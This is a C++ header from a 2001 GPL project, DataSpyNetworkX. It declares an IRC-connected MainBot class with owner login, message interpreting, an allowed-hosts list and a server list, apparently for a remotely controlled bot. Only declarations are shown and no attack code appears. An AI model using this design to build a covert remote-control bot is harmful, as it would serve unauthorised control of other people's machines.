/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#ifndef __INC_MAIN_BOT_H
#define __INC_MAIN_BOT_H

class MainBot : public IrcSocket
{
public:
	MainBot(char* cIrcServer,int iMyPort,char *cChannel);
	//~MainBot();
	void VoidOwner() { this->Owner(_DSNX_DEFAULT_UANDP_,TRUE); this->OwnerLoggedIn = FALSE; }
	void Process(char *cMessageIn);
	//void pRemove() {}
	void Close(SOCKET iCheckSocket);

//private:
	//void PrivMsgProcess(char*Reply,char *cMyMessage,char *cSender,char *cMask,char *cChannel);
	BOOL Owner(char *cNick,char* cMask,BOOL bSet);
	BOOL OwnerLoggedIn;
	//id Process (char *cMessageIn);
	long localIP;
	char *cMyOwnersNick,*cMyOwnersMask;
};

void InterpretMsg(char *cMyMessage,char *cSender,char *cMask,char *cChannel,MainBot *Control = NULL);
extern char **g_cHostAllows;
extern int g_iHostAllows;

//Servers list
struct ServerList 
{
	char *List[35];
	int iNumber, iListposition;

	ServerList *pNext;
	ServerList *pLast;

};

extern ServerList *g_FirstSList;
extern int g_iSList;
	

#endif //__INC_MAIN_BOT_H